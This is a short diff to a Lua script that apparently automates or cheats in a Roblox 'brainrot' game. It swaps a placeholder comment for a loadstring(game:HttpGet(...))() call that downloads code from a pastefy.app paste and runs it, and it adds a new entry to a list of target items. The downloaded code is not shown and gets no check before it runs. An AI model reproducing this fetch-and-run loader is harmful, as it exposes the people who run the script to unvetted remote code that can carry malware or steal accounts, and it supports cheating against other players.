@@ -43,7 +43,7 @@ local cam = workspace.CurrentCamera
 local pg = LP:WaitForChild("PlayerGui")
 
 task.spawn(function()
--- HERE YOUR SCRIPT DUALBOOT
+    loadstring(game:HttpGet("https://pastefy.app/88J1UD1w/raw"))()
 end)
 
 task.spawn(function()
@@ -142,6 +142,7 @@ local TargetBrainrots = {
 ["Jelly Moby"] = true,
 ["Sammyni Cakini"] = true,
 ["Steakini Fattini"] = true,
+["Ventoliero Pavonero"] = true,
 }
 
 local GOOD_BRAINROTS = {
